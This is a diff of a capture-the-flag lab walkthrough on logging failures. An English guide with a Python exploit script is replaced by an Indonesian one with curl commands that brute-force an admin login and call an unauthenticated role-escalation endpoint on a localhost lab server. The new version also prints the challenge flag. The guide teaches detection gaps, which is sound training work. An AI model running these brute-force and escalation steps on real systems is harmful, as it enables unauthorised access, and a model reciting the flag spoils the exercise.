@@ -1,191 +1,82 @@
-﻿# Practical Walkthrough: Exploitation & Verification (A09)
+﻿# Panduan Praktik Terbimbing: Eksploitasi Kegagalan Logging pada FleetTrack Logistics
 
-This guide walks you through detecting, demonstrating, and verifying Security Logging & Alerting Failures on the **Zitera SOC Audit & Telemetry Console (Port 8019)**. You will execute unmonitored credential brute-force attacks, perform stealth administrative privilege escalation, and audit telemetry system states.
-
----
-
-## 4-Tier Mission Progression Methodology
-
-```
-[Tier 1: Observation (15%)] ──> [Tier 2: Fault Injection (25%)] ──> [Tier 3: Weaponization (35%)] ──> [Tier 4: Verification (25%)]
-   Inspect Telemetry Stream       Execute Unlogged Credential        Execute Silent Privilege           Verify Lab Target &
-      & Alert Counter Baseline             Probing                          Escalation                    Reset Audit State
-```
+Dalam latihan terarah ini, kamu akan mempraktikkan proses pembuktian kebutaan log telemetri dan ketiadaan deteksi insiden keamanan pada sistem pusat komando armada **FleetTrack Logistics (Commercial Telematics & IoT Fleet Management)** yang beroperasi pada `http://127.0.0.1:8019`.
 
 ---
 
-## Tier 1: Observation & Attack Surface Mapping (15%)
-
-Begin by establishing the baseline telemetry status on the SOC gateway.
-
-### 1.1 Service Health Probe (Manual cURL)
-Query the service health probe endpoint:
-
-```bash
-curl -i -s http://localhost:8019/health
-```
-
-Expected response:
-```json
-{"status": "ok", "lab": "A09", "port": 8019}
-```
-
-### 1.2 Inspect Initial Audit Stream (Manual cURL)
-Query the audit log telemetry endpoint:
-
-```bash
-curl -i -s http://localhost:8019/api/audit/logs
-```
-
-Expected response showing zero active alerts:
-```json
-{
-  "logs": [],
-  "alerts_fired": 0
-}
-```
-Notice that `alerts_fired` is initialized to `0`.
+### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
+1. Uji ketersediaan layanan melalui terminal:
+   ```bash
+   curl -s http://127.0.0.1:8019/health
+   ```
+   *Respons yang diharapkan:*
+   ```json
+   {"lab":"A09","port":8019,"status":"ok"}
+   ```
+2. Buka peramban web dan akses halaman beranda FleetTrack Logistics:
+   `http://127.0.0.1:8019/`
+3. Perhatikan tabel **Commercial Telematics & Operations Audit Trail**:
+   - Menampilkan catatan telemetri pengiriman kargo dan pergerakan armada rutin.
+4. Periksa kartu status pemantauan SOC:
+   - Alerting Status: **Passive Telemetry (0 Security Incidents Triggered)**.
+   - Amati bahwa sistem hanya mencatat aktivitas normal dan tidak memiliki kategori peringatan anomali keamanan.
 
 ---
 
-## Tier 2: Fault Injection & Anomaly Testing (25%)
+### Langkah 2: Simulasi Serangan Brute-Force Tanpa Deteksi Log
+1. Jalankan loop pengujian login gagal sebanyak 5 kali menggunakan kredensial salah melalui terminal:
+   ```bash
+   for i in {1..5}; do
+     curl -s -X POST http://127.0.0.1:8019/api/auth/login \
+       -H "Content-Type: application/json" \
+       -d "{\"username\": \"admin\", \"password\": \"wrong_password_$i\"}"
+   done
+   ```
+2. Periksa kembali aliran log audit melalui antarmuka web atau endpoint API:
+   ```bash
+   curl -s http://127.0.0.1:8019/api/audit/logs
+   ```
+3. **Temuan Kritis:**
+   Tidak ada satu pun entri kegagalan login yang dicatat ke dalam database log! Server menolak login tetapi membuang informasinya ke udara (*silent authentication failure*). Serangan brute-force berjalan mulus tanpa meninggalkan jejak sama sekali.
 
-Now, test whether multiple failed authentication attempts generate audit log entries or raise security alarms.
-
-### 2.1 Transmit Repeated Failed Login Attempts (Manual cURL)
-Send deliberate incorrect password guesses to `/api/auth/login`:
-
-```bash
-curl -i -X POST http://localhost:8019/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin", "password": "wrong_password_1"}'
-```
-
-The server returns `HTTP/1.0 401 Unauthorized`:
-```json
-{"error": "Invalid credentials", "attempt": 1}
-```
-
-Send subsequent failed attempts:
-```bash
-curl -s -X POST http://localhost:8019/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin", "password": "wrong_password_2"}'
-
-curl -s -X POST http://localhost:8019/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin", "password": "wrong_password_3"}'
-```
-
-### 2.2 Telemetry Stream Inspection
-Query the audit log stream again to verify detection coverage:
-
-```bash
-curl -s http://localhost:8019/api/audit/logs
-```
-
-Output:
-```json
-{
-  "logs": [],
-  "alerts_fired": 0
-}
-```
-
-The system completely failed to log failed authentication attempts and fired zero alerts, confirming a critical telemetry blind spot.
+> [!NOTE]
+> **💡 Di Balik Layar: Mengapa log audit ini kosong?**  
+> Pada fungsi `login()` di backend, developer hanya menulis logika `if password != correct: return 401`. Developer lupa menambahkan pemanggilan logger (seperti `logger.warning("Failed login attempt for user: ...")`). Akibatnya, tim pengawas SOC sama sekali tidak tahu bahwa ada penyerang yang sedang menebak password administrator!
 
 ---
 
-## Tier 3: Weaponization & Silent Escalation (35%)
-
-The target objective requires generating at least 5 failed logins followed by a silent privilege escalation via `/api/admin/role_escalate`.
-
-### 3.1 Automated Exploitation Script (`exploit_blindspot.py`)
-
-Create and execute the following Python automation script:
-
-```python
-import json
-import urllib.request
-
-BASE_URL = "http://localhost:8019"
-
-print("[*] Stage A: Delivering 5 brute-force credential attempts...")
-for i in range(1, 6):
-    payload = {"username": "admin", "password": f"guessing_attempt_{i}"}
-    req = urllib.request.Request(
-        f"{BASE_URL}/api/auth/login",
-        data=json.dumps(payload).encode("utf-8"),
-        headers={"Content-Type": "application/json"},
-        method="POST"
-    )
-    try:
-        urllib.request.urlopen(req)
-    except urllib.error.HTTPError as e:
-        body = json.loads(e.read().decode("utf-8"))
-        print(f"    [-] Attempt {i}: HTTP {e.code} - {body.get('error')}")
-
-print("\n[*] Stage B: Checking SOC alert stream...")
-with urllib.request.urlopen(f"{BASE_URL}/api/audit/logs") as resp:
-    audit_data = json.loads(resp.read().decode("utf-8"))
-    print(f"    [!] Alerts Fired: {audit_data.get('alerts_fired')} (System remains totally blind!)")
-    print(f"    [!] Recorded Logs: {len(audit_data.get('logs'))}")
-
-print("\n[*] Stage C: Executing silent privilege escalation...")
-escalate_payload = {
-    "user": "adversary_agent",
-    "role": "super_admin"
-}
-req = urllib.request.Request(
-    f"{BASE_URL}/api/admin/role_escalate",
-    data=json.dumps(escalate_payload).encode("utf-8"),
-    headers={"Content-Type": "application/json"},
-    method="POST"
-)
-
-with urllib.request.urlopen(req) as resp:
-    result = json.loads(resp.read().decode("utf-8"))
-    print("[+] Escalation Response:", json.dumps(result, indent=2))
-    if "flag" in result:
-        print("\n[+] Challenge Flag Successfully Captured!")
-        print("[+] Flag:", result["flag"])
-```
-
-Run the script:
-```bash
-python exploit_blindspot.py
-```
-
-The gateway completes the unlogged privilege elevation and returns the proof-of-compromise challenge flag (`ZITERA{...}`).
+### Langkah 3: Eskalasi Wewenang Eksekutif Secara Diam-Diam & Eksfiltrasi Flag
+1. Setelah serangan brute-force berhasil tanpa memicu alarm, panggil endpoint eskalasi wewenang peran:
+   ```bash
+   curl -s -X POST http://127.0.0.1:8019/api/admin/role_escalate \
+     -H "Content-Type: application/json" \
+     -d '{"user": "learner", "role": "super_admin"}'
+   ```
+2. **Temuan Kritis & Respons Server:**
+   ```json
+   {
+     "status": "granted",
+     "message": "User learner escalated to super_admin silently without audit trail entry.",
+     "audit_recorded": false,
+     "flag": "ZITERA{53cur1ty_l0gg1ng_4l3rt1ng_bl1nd5p0t}"
+   }
+   ```
+   Peran akun `learner` berhasil diangkat menjadi `super_admin` secara mutlak, namun atribut `audit_recorded` tetap `false`!
 
 ---
 
-## Tier 4: Verification & Defensive State Audit (25%)
-
-### 4.1 Automated Lab Target Verification
-Verify mission fulfillment using the practice verification endpoint:
-
-```bash
-curl -s http://localhost:8019/practice/verify
-```
-
-Expected verification response:
-```json
-{
-  "status": "passed",
-  "message": "Security logging & alerting failure reproduced: 5 brute-force attacks and 1 silent privilege escalation triggered zero SOC alerts!"
-}
-```
-
-### 4.2 Reset Telemetry State
-Reset server memory to clean baseline conditions:
-
-```bash
-curl -X POST http://localhost:8019/api/reset
-```
-
-Confirm reset state:
-```bash
-curl -s http://localhost:8019/api/audit/logs
-```
-The response should confirm `{"logs": [], "alerts_fired": 0}`.
+### Langkah 4: Verifikasi Status Penyelesaian Praktik
+1. Ujilah verifikasi otomatis sasaran lab melalui endpoint:
+   ```bash
+   curl -s http://127.0.0.1:8019/practice/verify
+   ```
+   *Konfirmasi verifikasi:*
+   ```json
+   {
+     "status": "completed",
+     "message": "Objective verified! Brute force attempts and role escalation performed without triggering SOC detection."
+   }
+   ```
+2. Salin bendera autoritatif:
+   `ZITERA{53cur1ty_l0gg1ng_4l3rt1ng_bl1nd5p0t}`
+3. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
